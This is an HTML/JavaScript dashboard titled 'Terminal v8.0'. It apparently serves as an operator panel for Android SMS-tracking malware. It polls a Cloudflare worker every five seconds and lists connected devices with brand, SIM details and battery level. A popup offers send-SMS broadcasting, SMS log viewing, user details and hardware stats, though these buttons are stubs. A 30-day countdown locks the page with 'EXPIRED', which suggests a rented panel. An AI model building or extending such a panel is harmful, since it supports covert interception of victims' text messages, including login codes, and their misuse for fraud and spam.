<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Terminal v8.0</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
    <style>
        :root {
            --bg: #000; --card: #111; --blue: #00d4ff; --green: #00ff88;
            --pink: #ff00ff; --red: #ff3131; --yellow: #fefe33;
        }
        * { box-sizing: border-box; font-family: 'Consolas', monospace; }
        body { background: var(--bg); color: #fff; margin: 0; padding: 15px; position: relative; }

        /* ⏳ Digital Countdown - Right Top Only */
        #countdown {
            position: absolute;
            top: 10px;
            right: 15px;
            font-size: 0.85rem;
            color: var(--red);
            font-weight: bold;
            letter-spacing: 1px;
            text-shadow: 0 0 5px rgba(255, 49, 49, 0.5);
        }

        /* 📋 Device List Container (Added padding to avoid overlap with timer) */
        #deviceContainer { display: flex; flex-direction: column; gap: 10px; margin-top: 30px; }
        
        .device-card {
            background: var(--card); border: 1px solid #222; border-radius: 12px;
            padding: 12px; display: flex; align-items: center; justify-content: space-between;
            transition: 0.2s; cursor: pointer; border-left: 3px solid var(--blue);
        }
        .device-card:active { transform: scale(0.98); }

        .serial { color: var(--yellow); font-weight: bold; width: 25px; font-size: 1rem; }
        .dev-main { flex: 1; margin-left: 10px; }
        .brand { font-size: 0.95rem; color: #fff; font-weight: bold; text-transform: uppercase; }
        .sub-text { font-size: 0.7rem; color: #666; }

        /* Status & Battery */
        .status-box { text-align: right; }
        .batt { font-weight: bold; font-size: 0.85rem; }
        .on-tag { font-size: 0.55rem; color: var(--green); font-weight: bold; }

        /* 📱 Popup Menu */
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.96); z-index: 1000; backdrop-filter: blur(10px); }
        .modal-content { background: #0c0c0c; width: 90%; max-width: 380px; margin: 30% auto; border-radius: 20px; padding: 20px; border: 1px solid var(--blue); position: relative; text-align: center; }
        .close { position: absolute; right: 15px; top: 10px; font-size: 24px; color: var(--red); cursor: pointer; }

        .grid-menu { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 20px; }
        .menu-box { background: #151515; padding: 15px; border-radius: 15px; border: 1px solid #333; }
        .menu-box i { font-size: 1.4rem; margin-bottom: 8px; display: block; }
        
        .c-sms { color: var(--blue); } .c-view { color: var(--yellow); }
        .c-user { color: var(--pink); } .c-dev { color: var(--green); }
    </style>
</head>
<body>

    <div id="countdown">30d 00h 00m 00s</div>

    <div id="deviceContainer">
        </div>

    <div id="menuModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal()">&times;</span>
            <h3 id="popBrand" style="color:var(--blue); font-size:1.1rem; margin-bottom:15px;">DEVICE</h3>
            
            <div class="grid-menu">
                <div class="menu-box c-sms" onclick="alert('CSV Broadcaster Ready')"><i class="fas fa-paper-plane"></i>SEND SMS</div>
                <div class="menu-box c-view" onclick="alert('Fetching Logs...')"><i class="fas fa-history"></i>VIEW SMS</div>
                <div class="menu-box c-user" onclick="alert('User Info Loaded')"><i class="fas fa-user-circle"></i>DETAILS</div>
                <div class="menu-box c-dev" onclick="alert('Hardware Stats')"><i class="fas fa-microchip"></i>HARDWARE</div>
            </div>
        </div>
    </div>

    <script>
        const API_URL = 'https://sms-tracker-worker.vikash6759ub.workers.dev/api/get-data';
        
        // ⏳ 30 Days Timer Logic (Simplified)
        let expiryDate = localStorage.getItem('v8_exp');
        if (!expiryDate) {
            expiryDate = new Date().getTime() + (30 * 24 * 60 * 60 * 1000);
            localStorage.setItem('v8_exp', expiryDate);
        }

        function runTimer() {
            const diff = expiryDate - new Date().getTime();
            if (diff <= 0) {
                document.body.innerHTML = "<div style='color:red; text-align:center; padding-top:100px;'>EXPIRED</div>";
                return;
            }
            const d = Math.floor(diff / 86400000);
            const h = Math.floor((diff % 86400000) / 3600000);
            const m = Math.floor((diff % 3600000) / 60000);
            const s = Math.floor((diff % 60000) / 1000);
            document.getElementById('countdown').innerText = `${d}d ${h}h ${m}m ${s}s`;
        }
        setInterval(runTimer, 1000);

        // 📡 Data Fetch (5s Refresh)
        async function fetchData() {
            try {
                const res = await fetch(API_URL);
                const data = await res.json();
                data.reverse(); 
                
                const container = document.getElementById('deviceContainer');
                container.innerHTML = data.map((d, i) => `
                    <div class="device-card" onclick='openModal(${JSON.stringify(d)})'>
                        <div class="serial">#${i + 1}</div>
                        <div class="dev-main">
                            <div class="brand">${d.brand || 'ANDROID'}</div>
                            <div class="sub-text">${d.sim_info || 'Node'}</div>
                        </div>
                        <div class="status-box">
                            <div class="batt" style="color:${parseInt(d.battery) < 20 ? 'var(--red)' : 'var(--green)'}">${d.battery}%</div>
                            <div class="on-tag">ONLINE</div>
                        </div>
                    </div>
                `).join('');
            } catch (e) { }
        }

        function openModal(d) {
            document.getElementById('popBrand').innerText = d.brand;
            document.getElementById('menuModal').style.display = 'block';
        }
        function closeModal() { document.getElementById('menuModal').style.display = 'none'; }

        fetchData();
        setInterval(fetchData, 5000);
    </script>
</body>
</html>
